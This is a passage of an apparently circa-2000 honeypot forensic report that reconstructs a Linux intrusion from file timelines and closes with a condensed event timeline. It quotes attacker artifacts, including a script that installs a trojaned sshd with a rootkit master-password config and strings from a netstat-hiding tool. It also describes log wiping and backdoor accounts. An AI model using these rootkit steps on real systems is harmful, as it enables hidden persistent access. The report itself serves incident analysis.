+lazarus tool as well as the config.h file used to enable the logging functionality.
+
+        ----------------------------
+        .Ci/install-sshd1
+        echo "installing sshd"
+        gunzip ssh-1.2.27*
+        tar -xvf ssh-1.2.27*
+        cd ssh*
+        make install
+        rm -rf /etc/sshd_config
+        cat << hi >> /etc/sshd_config
+        ...
+        rm -rf /usr/sbin/sshd /usr/sbin/sshd1
+        cp /usr/local/sbin/sshd1 /usr/sbin/sshd
+        echo "/usr/local/sbin/sshd1" >> /etc/rc.d/rc.local
+        ps aux | grep sshd | awk '{print "kill -1 "$2""}' > restart-sshd
+        chmod +x restart-sshd
+        echo "done installing sshd"
+        echo "now restarting"
+        echo "dont forget to remove the sshd folders"
+        ./restart-sshd
+        -----------------------------
+
+        sshd config.h
+        ----------------------------------------------------------
+        /* Define this if you want rootkit features of ssh */
+        #define USE_GLOBAL_PASS "d33e8f1a6397c6d2efd9a2aae748eb02"
+        #define SSHD_LOGGER "/usr/tmp/nap" 
+        ----------------------------------------------------------
+
+
+The BIND programs installed were named, irpd, ndc, and named-bootconf.  The binary files
+named, irpd, and ndc were all stripped of symbols preventing inspection of function names
+using nm.  The replacement of these programs suggests that the new binaries contain
+backdoors that allow later access to the system.  It is possible that they are also 
+simply versions of BIND programs with known vulnerabilities which would have the similar
+effects as a trojan.  Decompilation is recommended to further determine the exact nature
+of these programs.
+
+
+        -----------------------------------------------------------------------------------------------
+        Nov 08 00 08:54:10    43024 .a. -rwxr-xr-x root     root     /mnt/usr/bin/dir
+        Nov 08 00 08:54:22     6416 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/addr
+                             271188 m.. -rwxr-xr-x root     root     /mnt/usr/local/bin/dig
+        Nov 08 00 08:54:23   271188 ..c -rwxr-xr-x root     root     /mnt/usr/local/bin/dig
+                             241744 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/dnsquery
+                             260816 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/host
+                             263960 .a. -rwxr-xr-x root     root     /mnt/usr/local/sbin/irpd
+        Nov 08 00 08:54:24    38096 .a. -rwxr-xr-x root     root     /mnt/usr/bin/install
+                             176464 .a. -rwxr-xr-x root     root     /mnt/usr/bin/strip
+                               4096 m.c drwxr-xr-x root     root     /mnt/usr/local/bin
+                               3296 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/mkservdb
+                             241792 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/nsupdate
+                               4096 m.c drwxr-xr-x root     root     /mnt/usr/local/sbin
+                             263960 m.c -rwxr-xr-x root     root     /mnt/usr/local/sbin/irpd
+                             525412 m.c -rwxr-xr-x root     root     /mnt/usr/local/sbin/named
+                               7166 mac -rwxr-xr-x root     root     /mnt/usr/local/sbin/named-bootconf
+                              36960 mac -rwxr-xr-x root     root     /mnt/usr/local/sbin/ndc
+        Nov 08 00 08:54:25    33392 .a. -rwxr-xr-x root     root     /mnt/bin/cp
+                                547 .a. -rw-r--r-- root     root     /mnt/etc/named.conf
+                             525412 .a. -rwxr-xr-x root     root     /mnt/usr/local/sbin/named
+                               4096 m.c drwxr-xr-x root     root     /mnt/usr/sbin
+                             525412 mac -rwxr-xr-x root     root     /mnt/usr/sbin/named
+                              35504 .a. -rwxr-xr-x root     root     /mnt/usr/sbin/ndc
+                               2769 .a. -rw-r--r-- root     root     /mnt/var/named/named.ca
+                                422 .a. -rw-r--r-- root     root     /mnt/var/named/named.local
+                               1024 m.c drwxr-xr-x root     root     /mnt/var/run
+                                  5 mac -rw-r--r-- root     root     /mnt/var/run/named.pid
+                                  0 mac -rw------- root     root     /mnt/var/run/ndc
+        Nov 08 00 08:54:28   271188 .a. -rwxr-xr-x root     root     /mnt/usr/local/bin/dig 
+        -----------------------------------------------------------------------------------------------
+
+The 'addn' program is run adding class B networks to the list 'addy.awk'.  Program strings indicate
+these addresses are hidden in the trojaned netstat output.
+
+        ------------------------------------------------------------------------------------------
+        Nov 08 00 08:55:30     4096 m.c drwxr-xr-x root     root     /mnt/usr/libexec/awk
+                                 78 .a. -rw-r--r-- root     root     /mnt/usr/libexec/awk/addy.awk
+        Nov 08 00 08:55:47    12408 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/addn
+        Nov 08 00 08:55:51       78 m.c -rw-r--r-- root     root     /mnt/usr/libexec/awk/addy.awk 
+        ------------------------------------------------------------------------------------------
+
+        Contents of addy.awk
+        --------------------
+        1 65.1
+        2 65.1
+        1 134518464.134518444
+        2 134518464.134518444
+        1 216.149
+        2 216.149
+        --------------------
+
+        Excerpt from 'strings - addn' output
+        -------------------------------------------------
+        enter classb to hide in netstat:
+        %d.%d
+        doing it like they do it on the discovery channel
+        echo 1 %d.%d >> /usr/libexec/awk/addy.awk
+        echo 2 %d.%d >> /usr/libexec/awk/addy.awk
+        added %d.%d to the hidden list
+        -------------------------------------------------
+
+At this point, the attacker executes several scripts from the installed toolkit to further clean
+the system and remove evidence of the intrusion.  First, two backdoor accounts 'own' and 'adm1'
+are removed from the /etc/passwd and /etc/shadow files.  Then 'snap' is run again to clear
+entries from system logs.  'rmS' deletes trojan and RPM packages installed previously and 
+'chmod-it' removes the setuid bit from common utilities such as ping and traceroute.  This last 
+script is probably used to limit monitoring of the attacker to other root users and to limit
+exploitation of vulnerabilities that could exist in suid programs.
+
+        [ do erases backdoor accounts from password files ]
+        --------------------------------------------------------------------------------
+        Nov 08 00 08:55:58      657 m.c -rw-r--r-- root     root     /mnt/etc/passwd
+                                601 m.c -rw-r--r-- root     root     /mnt/etc/shadow
+                                328 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/do
+        --------------------------------------------------------------------------------
+        
+
+        [ snap removes events from system logs ]
+        ----------------------------------------------------------------------------------
+        Nov 08 00 08:56:02     1024 m.c drwxr-xr-x root     root     /mnt/var/log
+                               7974 mac -rw-r--r-- root     root     /mnt/var/log/messages
+                                268 mac -rw-r--r-- root     root     /mnt/var/log/secure
+                                  0 mac -rw-r--r-- root     root     /mnt/var/log/xferlog
+        Nov 08 00 08:56:04     3098 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/snap
+        ----------------------------------------------------------------------------------
+
+	[ rmS removes previously installed packages ]
+        ------------------------------------------------------------------------------------------------
+        Nov 08 00 08:56:11      188 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/rmS
+        ------------------------------------------------------------------------------------------------
+
+	[ chmod-it clears setuid bit from executables ]
+        --------------------------------------------------------------------------------------
+        Nov 08 00 08:56:59    17968 ..c -rwx------ root     root     /mnt/bin/ping
+                               5760 .a. -rwxr-xr-x root     root     /mnt/bin/sleep
+                              45388 ..c -rwx------ root     tty      /mnt/sbin/dump
+                              67788 ..c -rwx------ root     tty      /mnt/sbin/restore
+                              33288 ..c -rwx------ root     root     /mnt/usr/bin/at
+                              35168 ..c -rwx------ root     root     /mnt/usr/bin/chage
+                              36756 ..c -rwx------ root     root     /mnt/usr/bin/gpasswd
+                               5640 ..c -rwx------ root     root     /mnt/usr/bin/newgrp
+                             531516 ..c -rwx------ root     root     /mnt/usr/bin/sperl5.00503
+                             531516 ..c -rwx------ root     root     /mnt/usr/bin/suidperl
+                              34751 ..c -rwx------ root     root     /mnt/usr/libexec/pt_chown
+                              16488 ..c -rwx------ root     bin      /mnt/usr/sbin/traceroute
+                               5896 ..c -rwx------ root     root     /mnt/usr/sbin/usernetctl
+        Nov 08 00 08:57:00      699 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/chmod-it
+        --------------------------------------------------------------------------------------
+
+
+Here the attacker creates a hidden directory " " (that is a single space) within the drosen home
+directory and su's to the drosen account.  The mactime information and .bash_history show that
+the attacker built decompressed 'tpack*' and compiled the contents of the archive.  This archive
+contained the eggdrop bot source code found using lazarus and mentioned earlier in this document.
+
+        -------------------------------------------------------------------------------------------------
+        Nov 08 00 08:58:26    14188 .a. -rwsr-xr-x root     root     /mnt/bin/su
+                                331 .a. -rw-r--r-- root     root     /mnt/etc/pam.d/su
+                                124 .a. -rw-r--r-- drosen   drosen   /mnt/home/drosen/.bashrc
+                              17282 .a. -rwxr-xr-x root     root     /mnt/lib/security/pam_xauth.so
+        Nov 08 00 08:58:28    46384 .a. -rwxr-xr-x root     root     /mnt/bin/gunzip
+                              46384 .a. -rwxr-xr-x root     root     /mnt/bin/gzip
+                              46384 .a. -rwxr-xr-x root     root     /mnt/bin/zcat
+        Nov 08 00 08:58:41   144592 .a. -rwxr-xr-x root     root     /mnt/bin/tar
+        Nov 08 00 08:58:54    75600 .a. -rwxr-xr-x root     root     /mnt/bin/egrep
+                               6196 .a. -rwxr-xr-x root     root     /mnt/bin/uname
+        Nov 08 00 08:58:55    44880 .a. -rwxr-xr-x root     root     /mnt/bin/sed
+                              21264 .a. -rwxr-xr-x root     root     /mnt/usr/bin/tr
+        Nov 08 00 08:58:56    25680 .a. -rwxr-xr-x root     root     /mnt/bin/date
+                             104316 .a. -rwxr-xr-x root     root     /mnt/usr/bin/make
+        ...
+        Nov 08 00 08:58:57    13436 .a. -rwxr-xr-x root     root     /mnt/bin/chmod
+                              41104 .a. -rwxr-xr-x root     root     /mnt/bin/mv
+                               1024 m.c drwxrwxrwx root     root     /mnt/tmp
+                             207600 .a. -rwxr-xr-x root     root     /mnt/usr/bin/as
+                              63376 .a. -rwxr-xr-x root     root     /mnt/usr/bin/egcs
+                              63376 .a. -rwxr-xr-x root     root     /mnt/usr/bin/gcc
+                              63376 .a. -rwxr-xr-x root     root     /mnt/usr/bin/i386-redhat-linux-gcc
+                             205136 .a. -rwxr-xr-x root     root     /mnt/usr/bin/ld
+                               2315 .a. -rw-r--r-- root     root     /mnt/usr/include/_G_config.h
+                               1313 .a. -rw-r--r-- root     root     /mnt/usr/include/alloca.h
+                              13327 .a. -rw-r--r-- root     root     /mnt/usr/include/bits/confname.h
+                               3406 .a. -rw-r--r-- root     root     /mnt/usr/include/bits/posix_opt.h
+                               1297 .a. -rw-r--r-- root     root     /mnt/usr/include/bits/stdio_lim.h
+                              21810 .a. -rw-r--r-- root     root     /mnt/usr/include/bits/string.h
+                              41832 .a. -rw-r--r-- root     root     /mnt/usr/include/bits/string2.h
+                               2015 .a. -rw-r--r-- root     root     /mnt/usr/include/bits/time.h
+                               4680 .a. -rw-r--r-- root     root     /mnt/usr/include/bits/types.h
+                               9512 .a. -rw-r--r-- root     root     /mnt/usr/include/features.h
+                               5861 .a. -rw-r--r-- root     root     /mnt/usr/include/getopt.h
+                               1021 .a. -rw-r--r-- root     root     /mnt/usr/include/gnu/stubs.h
+                              11673 .a. -rw-r--r-- root     root     /mnt/usr/include/libio.h
+                              20926 .a. -rw-r--r-- root     root     /mnt/usr/include/stdio.h
+                              13456 .a. -rw-r--r-- root     root     /mnt/usr/include/string.h
+                               4951 .a. -rw-r--r-- root     root     /mnt/usr/include/sys/cdefs.h
+                               2058 .a. -rw-r--r-- root     root     /mnt/usr/include/sys/sysmacros.h
+                               5337 .a. -rw-r--r-- root     root     /mnt/usr/include/sys/time.h
+                               9314 .a. -rw-r--r-- root     root     /mnt/usr/include/time.h
+                              36756 .a. -rw-r--r-- root     root     /mnt/usr/include/unistd.h
+        -----------------------------------------------------------------------------------------------
+
+The creation of /var/tmp/nap indicates that a login occurred though the trojaned sshd which recorded the
+new connection.   This seems to be a mistake on the part of the attacker.  The record should have been 
+removed or ssh not used since the incoming host is logged.  The incoming host is 
+'c871553-b.jffsn1.mo.home.com'.  Notice that no entries are made to utmp or wtmp at login indicating 
+this functionality was removed from sshd.
+
+        ---------------------------------------------------------------------------------------
+        Nov 08 00 09:02:28       10 .a. lrwxrwxrwx root     root     /mnt/usr/tmp -> ../var/tmp
+                               1024 m.c drwxrwxrwx root     root     /mnt/var/tmp
+                                184 mac -rw-r--r-- root     root     /mnt/var/tmp/nap
+        ---------------------------------------------------------------------------------------
+
+This appears to be the attacker using pico to edit the inet configuration file.
+Probably removing the rootshell entry created by the rpc.statd shellcode.  Then a killall
+to make the daemon reread the configuration file.  The use of the pico editor seems a bit
+unusual given the predominance of either vi or emacs among dedicated *nix users.  The
+intruder may be relatively inexperienced with these more standard text editors or simply
+prefers pico.  This information could be useful in determining other compromises in which
+this particular intruder may have been involved.
+
+        ----------------------------------------------------------------------------------------
+        Nov 08 00 09:02:42   166416 .a. -rwxr-xr-x root     root     /mnt/usr/bin/pico
+        Nov 08 00 09:03:05     3027 m.c -rw-r--r-- root     root     /mnt/etc/inetd.conf
+        Nov 08 00 09:03:12     3027 .a. -rw-r--r-- root     root     /mnt/etc/inetd.conf
+                              10160 .a. -rwxr-xr-x root     root     /mnt/usr/bin/killall
+        ----------------------------------------------------------------------------------------
+ 
+The attacker seems to be done with the system for now.  Clears the screen and logs out.
+
+        -----------------------------------------------------------------------------------------------
+        Nov 08 00 09:03:15       24 .a. -rw-r--r-- root     root     /mnt/root/.bash_logout
+                               3124 .a. -rwxr-xr-x root     root     /mnt/usr/bin/clear
+        -----------------------------------------------------------------------------------------------
+
+
+So after an initial probe around midnight, the intruder came back early Nov 8 around 8:45 am.
+Using the same rpc.statd technique found previously, the intruder enters the system and 
+rapidy installs a set of trojaned binaries and exploit tools.  Less than 20 minutes later
+several vulnerabilities are patched, tools installed, and the intruder leaves.
+At 8:37pm local time, a console login by root occurs.  It seems the owner of the system 
+has come back.  No system file access occurs after Nov 8 9:10 pm CST.
+
+
+Appendix A - Condensed System Timeline
+--------------------------------------
+
+======================================
+Compromised System Timeline
+ 
+  OS:  Linux Kernel 2.2.14-5
+       Redhat 6.2 Server Installation
+Host:  apollo.honeyp.edu
+  IP:  172.16.1.107
+Time:  GMT-0600 (Chicago CST)
+======================================
+ 
+SOURCE  TIME OF EVENT                   EVENT DESCRIPTION
+------  -------------                   -----------------
+MAC     Nov 5 09:33:20 - 10:52:33       System Startup
+MAC     Nov 5 10:52:35 - Nov 6 03:00:41 Change made to eth0 configuration
+MAC     Nov 6 04:02:00 - 04:02:06       Daily cronjob runs
+IDS     Nov 7 23:11:31                  IDS detects RPC info query from attacker to victim
+IDS     Nov 7 23:11:31                  IDS portscan detects two connections from attacker to 1 host
+IDS     Nov 7 23:11:31                  IDS registers two telnet connections from attacker to 172.16.1.101
+IDS     Nov 7 23:11:47                  IDS portscan detects two connections from attacker to 2 hosts
+IDS     Nov 7 23:11:51                  IDS detects RPC status request from attacker to victim
+IDS     Nov 7 23:11:51                  IDS detects Shellcode sent from attacker to port 871 on victim
+secure  Nov 8 00:08:40                  2 Telnet connections from 216.121.247.2 (registered in secure log)
+msgs    Nov 8 00:08:41                  Internet Daemon killed twice... fits rpc.statd vulnerability profile
+d msgs  Nov 8 00:09:00                  rpc.statd shellcode exploit attempted
+MAC     Nov 8 08:25:53 - 08:33:42       ftp program executed
+MAC     Nov 8 08:45:18 - 08:51:56       Login followed by installation of intruder toolkit
+MAC     Nov 8 08:51:54 - 08:51:56       Intruder installs toolkit files  and modifies hosts.deny
+MAC     Nov 8 08:52:09 - 08:52:10       Intruder deletes command history logging
+MAC     Nov 8 08:52:09                  Modifies history files by linking to /dev/null
+MAC     Nov 8 08:52:10 - 08:52:12       Creates backup of original system binaries (indicates installation of rootkit trojans)
+MAC     Nov 8 08:52:12 - 08:52:15       Installs scripts and hidden process/network lists.
+MAC     Nov 8 08:52:13                  Starts sniffer program
+MAC     Nov 8 08:52:14 - 08:52:15       Runs 'clean' to erase log file entries
+MAC     Nov 8 08:52:25 - 08:52:31       Installs am-utils-6.0 RPM package
+MAC/RPM Nov 8 08:52:25 - 08:52:31       Installs automounter (am-utils-6.0.1s11-1.6.0) utilities and edits configuration
+MAC/RPM Nov 8 08:52:32                  BitchX IRC client started and installation of NIS server (ypserv-1.3.9-1)  
+MAC/RPM Nov 8 08:52:32                  Installs make package (make-3.77-6)
+MAC/RPM Nov 8 08:52:32                  Installs line printer utilities package (lpr-0.48-1)
+RPM     Nov 8 08:52:33                  Installs screen package (screen-3.9.4-3)
+RPM     Nov 8 08:52:33                  Installs telnet package (telnet-0.10-29)
+MAC     Nov 8 08:52:34 - 08:53:06       Installs BitchX IRC client
+MAC     Nov 8 08:52:34 - 08:53:28       Moves BitchX client to bin
+MAC     Nov 8 08:53:08 - 08:53:33       Installs new ssh client/server
+MAC     Nov 8 08:53:33                  New sshd server started
+MAC     Nov 8 08:53:40 - 08:53:41       Installs wu-ftpd-2.6.0 package (wu-ftpd-2.6.0-14.6x) and starts ftp server
+MAC     Nov 8 08:53:40 - 08:53:43       Installation of wuftp program (from rpm?)
+MAC/RPM Nov 8 08:53:47 - 08:53:50       Installs updated nfs-utils-0.1.9.1 RPM to patch exploited hole
+MAC     Nov 8 08:54:10 - 08:54:28       Installation of bind utils and named
+MAC     Nov 8 08:54:22 - 08:54:25       Installs BIND
+MAC     Nov 8 08:55:30 - 08:55:51       Create list of IP address not shown by netstat
+MAC     Nov 8 08:55:30 - 08:56:08       Creates hidden net address file, new passwd files, erases log entries
+MAC     Nov 8 08:55:58                  'do' removes  backdoor accounts from passwd and shadow
+MAC     Nov 8 08:56:02 - 08:56:08       'snap' removes IP,host,user entries from log files
+MAC     Nov 8 08:56:11 - 08:56:57       'rmS' removes ssh, wuftp, nfs-utils packages and install script
+MAC     Nov 8 08:56:59 - 08:57:19       'chmod-it' removes setuid from system binaries
+MAC     Nov 8 08:56:59 - 08:57:00       Removes setuid bit from binaries
+MAC     Nov 8 08:58:26 - 09:02:23       'su' to drosen account followed by decompression and compilation of ???
+MAC     Nov 8 08:59:07 - 09:03:05       Clears user's history, creates nap file, changes inetd.conf back
+MAC     Nov 8 09:02:28                  Creation of txt file nap containing a root login and plaintext password
+MAC     Nov 8 09:02:30 - 09:02:32       Use of trojaned ps and w
+MAC     Nov 8 09:02:42 - 09:03:12       Hand editing of inetd.conf then restart inetd
+MAC     Nov 8 09:03:15                  Intruder logs out of root account
+MAC     Nov 8 20:37:30 - 20:37:42       Begin login at console since no ssh/telnet active ( as root ?)
+MAC     Nov 8 20:37:37 - 22:10:01       Big Brother was watching... makes copy of disk soon after
+MAC     Nov 8 21:01:00 - 21:10:11       Running of hourly cron job followed by rmmod every 10 minutes
+MAC     Nov 8 21:10:27 - 22:10:01       Use of trojaned ls reading /usr/man/r for hidden files
+
+----------
+References
+----------
+[1] tripwire_info/tw.db.rh62standard -- Tripwire database of standard Redhat 6.2
+[2] mactime/vicim.mactime.evidence   -- Contains mactime output from 11/05/2000 to 11/08/2000
+[3] reports/attackertools.txt        -- Detailed analysis of attacker tools added to the system
+[4] http://www.justlinux.com/bin/feature/story.pl?fid=1929218
+    comp.security.linux  subject: I need help to remove OZ Date: Date: 2000-09-11 08:03:32 PST
+[5] http://groups.google.com         -- Usenet archive search engine (beta version)
+[6] symbols/sniff.symbols.p          -- Symbols recovered from unstripped executable using 'nm -p' 
+[7] strings/snif.strings             -- ASCII strings in snif executable using 'strings - snif'
+[8] RPM Install Date Retrieval Command
+    rpm --dppath /mnt/var/lib/rpm -qi `rpm --dppath /mnt/var/lib/rpm -qa` | grep "Install date"
+[9] lazarus/eggdrop	             -- Pieces of text files retrieved from free disk space using lazarus
